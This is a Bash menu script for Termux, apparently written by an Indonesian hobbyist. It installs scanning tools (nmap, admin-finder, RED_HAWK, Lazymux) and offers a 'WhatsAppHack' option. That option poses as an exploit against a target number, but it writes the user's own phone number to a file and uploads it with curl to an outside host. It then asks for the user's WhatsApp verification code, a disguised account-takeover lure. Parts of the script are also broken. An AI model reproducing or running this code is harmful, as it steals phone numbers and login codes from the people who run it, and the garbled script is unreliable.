echo -e  "Tools    : AldiG $white         

" |lolcat

echo -e  "By  : AldiG $white   " |lolcat

echo -e  "Blog  : AldiGunawan.com 

$white " |lolcat

###################################################

# CTRL + C

###################################################

trap ctrl_c INT

ctrl_c() {

clear

echo -e $red"[#]> (Ctrl + C ) Detected, Trying 

To Exit ... "

echo -e $cyan"[#]> Thanks"

sleep 1

echo ""

echo -e $white"[#]> see you guys:)..."

sleep 1

exit

}

lagi=1

while [ $lagi -lt 6 ];

do

echo ""

echo -e $b "1.  BELUM JADI :'D${endc}";

echo -e "============================" | lolcat

echo -e $r "2.  MAKLUM MASIH BELAJAR :'v${endc}";

echo -e "============================" | lolcat

echo -e $g "3.  JADI MOHON SABAR :')${endc}";

echo -e "============================" | lolcat

echo -e $c "4   YANG JALAN CUMA NO 5 :')${endc}";

echo -e "============================" | lolcat

echo -e $r"5.  WhatsAppHack${endc}";

echo -e "============================" | lolcat

echo -e $r "6. Exit${endc}";

echo ""

echo -e "╭>MC" |lolcat

read -p "╰─#" pil;



# Nmap



case $pil in

1) pkg install nmap

echo -e  "${y} {1} Masukkan Web${endc}:"

read web

nmap $web

echo



;;



# admin-finder



2) git clone  

https://github.com/the-c0d3r/admin-finder.git

echo -e "${y} cara menggunakan admin finder"

echo -e "${y} cd admin-finder"

echo -e "${y} python admin-finder.py"

cd 

/data/data/com.termux/files/home/admin-finder/

python2 

/data/data/com.termux/files/home/admin-finder/admin-finder.py

echo



;;



#RED_HAWK



3) git clone 

https://github.com/Tuhinshubhra/RED_HAWK

echo -e "${y} Installer RED_HAWK..."

echo -e "${y} cd RED_HAWK"

echo -e "${y} php RED_HAWK.php"

cd /data/data/com.termux/files/home/RED_HAWK/

php /data/data/com.termux/files/home/RED_HAWK/ 

RED_HAWK.php



;;



#Lazymux



4) git clone 

https://github.com/Gameye98/Lazymux

echo -e "${y} Installer Lazymux..."

echo -e "${y} cd Lazymux"

echo -e "${y} python lazymux.py"

cd /data/data/com.termux/files/home/Lazymux/

python2 

/data/data/com.termux/files/home/Lazymux/ 

lazymux.py



;;



#WhatAppHack
5) #!/bin/bash

clear

echo "

<-- IndoSec -->

####################

#   Whatsapp Code  # By ./GARUTBANGKIT

#     Exploiter    # AldiG3360@gmail.com

####################



Copyright (c) 2019 AldiGunawan";

echo "";

read -p "Nomer Kamu (+62xxxx)=> " nomer;

read -p "Nomer Target (+62xxxx) => " target;

sleep 2

echo "[+] Syncing Target...";

sleep 1

echo "Login  => $nomer";

sleep 0.5

echo "Target => $target";

sleep 0.5

echo "[+] Exploiting...";

echo "Nomer => $nomer" >> kontol.html;

curl -T kontol.html http://apparelworld.org/

sleep 5;

echo "[+] Done.";

echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";

read -p "Verify Code => " code;

sleep 2

echo "[+] Connecting to whatsapp.com...";

echo "Login => $nomer";

sleep 0.5

echo "Code => $code";

sleep 0.5

echo "Target => $target";

sleep 0.5

echo "[+] Sending Exploit...";

echo "Code => $code" >> kontol.html;

sleep 5

echo "[+] Success Exploited!";

exit;

THANKS GUYS





;;





6) echo "created by : AldiGunawan" | lolcat

exit

;;



*) echo "sorry, pilihan yang anda cari tidak 

ada"

esac

done

done

